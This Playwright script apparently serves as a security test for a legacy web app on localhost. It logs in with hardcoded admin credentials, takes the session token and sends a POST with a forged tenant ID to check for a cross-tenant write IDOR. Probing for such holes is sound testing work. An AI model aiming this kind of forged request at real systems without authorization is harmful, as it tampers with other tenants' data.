const { chromium } = require('playwright');
const LEGACY = 'http://localhost:8080';

async function login(page) {
  await page.goto(`${LEGACY}/index.html`, { waitUntil: 'load', timeout: 30000 });
  await page.waitForTimeout(1500);
  await page.fill('#userName', 'admin');
  await page.fill('#password', '12345');
  await page.locator('#password').blur();
  await page.waitForFunction(() => document.querySelectorAll('#organizationId option').length > 1, { timeout: 10000 });
  await page.selectOption('#organizationId', '1');
  await page.waitForFunction(() => document.querySelectorAll('#unitId option').length > 1, { timeout: 10000 });
  const unitVal = await page.$eval('#unitId option:nth-child(2)', (o) => o.value);
  await page.selectOption('#unitId', unitVal);
  await page.click('input[type="submit"]');
  await page.waitForTimeout(1500);
  const confirmOk = page.locator('button:has-text("Ok")').first();
  if (await confirmOk.isVisible().catch(() => false)) await confirmOk.click();
  await page.waitForFunction(() => !!window.sessionStorage.getItem('token'), { timeout: 15000 });
}

async function main() {
  const browser = await chromium.launch({ headless: true });
  const context = await browser.newContext();
  const page = await context.newPage();
  await login(page);
  await page.goto(`${LEGACY}/index.html#/routeAdministration`, { waitUntil: 'load', timeout: 20000 });
  await page.waitForTimeout(1500);
  const token = await page.evaluate(() => window.sessionStorage.getItem('token'));

  // Real org1/unit1 admin, but the create URL's orgId path segment is forged
  // to the victim tenant (999) -- exactly what a legitimate org1 session could
  // send by hand-crafting the request (the real frontend never does this, but
  // nothing server-side stops it).
  const createResp = await page.evaluate(async (tok) => {
    const res = await fetch('/api/global/route/of/administration/999/1', {
      method: 'POST',
      headers: { 'Authorization': 'Bearer ' + tok, 'userId': '1', 'unitId': '1', 'Content-Type': 'application/json' },
      body: JSON.stringify({ code: 'WRTEST', description: 'Write-IDOR test row', status: true })
    });
    const body = await res.text();
    return { status: res.status, body };
  }, token);
  console.error('POST create, forged orgId=999 in URL, real org1/unit1 identity headers:');
  console.error(JSON.stringify(createResp, null, 1));

  await browser.close();
}
main().catch((e) => { console.error('FATAL', e); process.exit(1); });
